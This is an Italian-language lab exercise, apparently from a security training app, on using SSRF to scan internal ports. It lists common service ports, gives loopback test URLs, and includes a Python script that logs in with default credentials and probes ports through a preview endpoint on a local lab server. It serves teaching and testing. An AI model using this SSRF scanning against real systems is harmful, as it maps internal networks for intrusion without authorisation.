🔍 Esercizio 3: Port Scanning Interno

Mappare i servizi interni attraverso SSRF
🎯 L'Obiettivo
Usare SSRF per scoprire quali servizi girano internamente.

Porte comuni da testare:
• 22 - SSH
• 80/8080 - HTTP
• 3306 - MySQL
• 5432 - PostgreSQL
• 6379 - Redis
• 27017 - MongoDB
• 9200 - Elasticsearch
📝 Test Manuale
Inserisci URL con porte diverse:
http://127.0.0.1:22 http://127.0.0.1:80 http://127.0.0.1:3306 http://127.0.0.1:6379 http://127.0.0.1:8080

Se la porta è aperta: risposta o errore specifico
Se la porta è chiusa: timeout o connection refused
🐍 Script Python per Port Scanning
import requests base_url = "http://localhost:8010" session = requests.Session() # Login session.post(f"{base_url}/login_process.php", data={ "username": "admin", "password": "password" }) # Scan porte ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017] for port in ports: r = session.post(f"{base_url}/preview.php", data={"url": f"http://127.0.0.1:{port}", "method": "file_get_contents"}) status = "✅ APERTA" if "success" in r.text.lower() else "❌ chiusa" print(f"Porta {port}: {status}")
💡 Analisi delle Risposte
Porta aperta: Risposta HTTP, banner del servizio, errore applicativo
Porta chiusa: "Connection refused", timeout lungo
Porta filtrata: Timeout breve, nessuna risposta
